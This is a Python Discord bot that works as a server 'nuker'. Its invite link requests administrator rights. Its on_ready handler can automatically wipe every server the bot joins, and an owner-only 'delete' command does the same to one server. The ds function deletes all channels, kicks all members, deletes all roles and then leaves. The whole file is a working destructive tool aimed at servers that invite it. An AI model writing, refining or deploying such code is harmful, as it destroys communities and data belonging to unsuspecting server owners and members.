import discord
from discord.ext import commands
import json

with open("settings.json") as f:
    settings = json.load(f)
bot = commands.Bot(command_prefix=settings["prefix"])


@bot.event
async def on_ready():
    print(f"Username: {bot.user.name}\nUserid: {bot.user.id}\nGuilds: {len(bot.guilds)}\nPrefix: {bot.command_prefix}\nInvite: https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot\n-----Log-----\n\n")
    with open("settings.json") as f:
        settings = json.load(f)
        if settings["type"] == "1":
            for guild in bot.guilds:
                await ds(guild.id)




@bot.command()
async def delete(ctx):
    with open("settings.json") as f:
        settings = json.load(f)
    if ctx.author.id in settings["owner"]:
        print(f"[{ctx.guild.name}] {ctx.author} ran Command '{bot.command_prefix}delete'!")
        if settings["confirmation"] == "1":
            msg = await ctx.send("Sure?")
            valid_reactions = ['✔️', '❌']
            for emoji in valid_reactions:
                await msg.add_reaction(emoji)

            def check(reaction, user):
                return user == ctx.author and str(reaction.emoji) in valid_reactions

            reaction, user = await bot.wait_for('reaction_add', timeout=60.0, check=check)
            if str(reaction.emoji) == valid_reactions[0]:
                print(f"[{ctx.guild.name}] {ctx.author} confirmed!")
                await ds(ctx.guild.id)
                return
            print(f"[{ctx.guild.name}] {ctx.author} cancelled!")
            await ctx.send("Cancelled")
        else:
            await ds(ctx.guild.id)
            return


async def ds(sid):
    server = bot.get_guild(sid)
    with open("settings.json") as f:
        settings = json.load(f)
    if sid in settings["protservers"]:
        return
    for channel in server.channels:
        try:
            await channel.delete()
        except Exception:
            print(f"[{server.name}] Skipping Channel '{channel.name}'!")
        else:
            print(f"[{server.name}] Deleted Channel '{channel.name}'!")
    for member in server.members:
        try:
            await member.kick()
        except Exception:
            print(f"[{server.name}] Skipping Member '{member}'!")
        else:
            print(f"[{server.name}] Kicked Member '{member}'!")
    for role in server.roles:
        try:
            await role.delete()
        except Exception:
            print(f"[{server.name}] Skipping Role '{role.name}'!")
        else:
            print(f"[{server.name}] Deleted Role '{role.name}'!")

    if settings["leave"] == "0":
        return
    else:
        await server.leave()
        print(f"Leaving {server.name}...")
        return


with open("settings.json") as f:
    settings = json.load(f)
    bot.run(settings["token"])
